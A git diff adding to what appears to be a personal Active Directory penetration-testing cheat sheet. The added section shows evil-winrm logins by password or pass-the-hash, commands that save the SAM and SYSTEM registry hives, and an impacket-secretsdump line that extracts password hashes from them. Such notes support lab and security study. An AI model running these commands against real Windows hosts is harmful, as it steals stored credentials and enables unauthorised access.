@@ -31,7 +31,26 @@ dig _ldap._tcp.dc._msdcs.<domain> SRV +short #
 ```bash
 nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain> # Check AD SRV records (DNS)
 ```
+## evil-winrm
+All commands are simple to linux documentation:
+https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
 
+```bash
+evil-winrm -i dns_name -u 'username' -p 'password'
+evil-winrm -i dns_name -u 'username' -H 'hash'
+evil-winrm --help
+upload file # upload file from local directory
+reg save HKLM\SAM C:\Users\Public\sam
+reg save HKLM\SYSTEM C:\Users\Public\system
+download <file> # download files to your local machine "sam" "system" or others
+sam to sam
+system to system
+```
+
+## impackets
+```bash
+impacket-secretsdump -sam sam -system system local # after sam and system in eliv-winrm
+```
 ## Priority ports:
 ### 445/tcp (SMB) — shares, scripts, creds, RCE vectors.
 ### 389/636/3268/3269 (LDAP/LDAPS/GC) — AD user/group/attributes.
